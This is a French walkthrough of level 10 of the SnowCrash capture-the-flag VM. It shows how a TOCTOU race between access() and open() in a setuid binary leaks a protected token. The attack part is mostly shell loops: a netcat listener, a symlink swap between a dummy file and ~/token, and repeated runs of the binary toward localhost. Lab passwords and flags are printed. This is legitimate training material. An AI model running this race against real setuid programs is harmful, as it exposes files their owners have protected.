@@ -1,0 +1,65 @@
+LEVEL 10
+--------
+
+1.  Commande:   ls
+    Sortie:     level10 token
+
+2.  On lance l'exécutable level10.
+    Commande:   ./level10
+    Sortie:     ./level10 file host
+	                sends file to host if you have access to it
+
+3.  Tout d'abord on fait un strings level10.
+    Commande:   strings level10
+    Sortie:     Connecting to %s:6969
+    Donc tout d'abord on sait qu'on va devoir écouter sur le port 6969.
+    La commande nc nous servira à ça.
+
+4.  Ensuite on lance un nm level10.
+    Commande:   nm -u level10
+    Sortie:     U access@@GLIBC_2.0
+                U open@@GLIBC_2.0
+    On sait que une faille existe avec ces 2 méthodes.
+    (https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole)
+    Explication: Le but de ce level est de lancer l'exécutable level10 en
+                 passant en argument un token ACCESSIBLE. Ce que l'on va faire,
+                 c'est créer un lien symbolique du token et pdt que la fonction
+                 access va procéder à la vérification sur notre lien. On va lancer
+                 en boucle le programme sur celui ci avant que la fonction open ne
+                 soit executée.
+
+5.  On a besoin de 3 fenêtres connectées en ssh à la VM de snow crash.
+    Commande:   ssh level10@<IP Machine SnowCrash> -p 4242 
+    Mdp:        s5cAJpM8ev6XHw998pRWG728z
+
+6.  Maintenant que les 3 sessions sont ouvertes.
+    On lance la commande chmod sur l'une des 3 sessions pour 
+    pouvoir créer des fichiers etc ...
+    Commande:   chmod 777 .
+
+7.  On créé un fichier vierge.
+    Commande:   touch a
+
+8.  On lance un script sur l'une des 3 sessions qui va 
+    écouter le port 6969 en boucle.
+    Script:     while true; do nc -l 6969; done
+
+9.  On va lancer un script qui créer un lien symoblique en boucle.
+    Script: while true; do ln -sf a b; ln -sf ~/token b; done
+
+10. Et enfin on va lancer un dernier script qui permet de lancer
+    l'exécutable en boucle avec le lien symbolique.
+    Script: while true; do ./level10 b 127.0.0.1; done
+
+11. Normalement si tout s'est bien passé, sur la session de l'écoute de port,
+    le token a été affiché.
+    Sortie:     woupa2yuojeeaaed06riuj63c
+
+12. Commande:   su flag10
+    Mdp:        woupa2yuojeeaaed06riuj63c
+
+13. Commande:   getflag
+    Mdp:        Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+14. Commande:   su level11
+    Mdp:        feulo4b72j7edeahuete3no7c
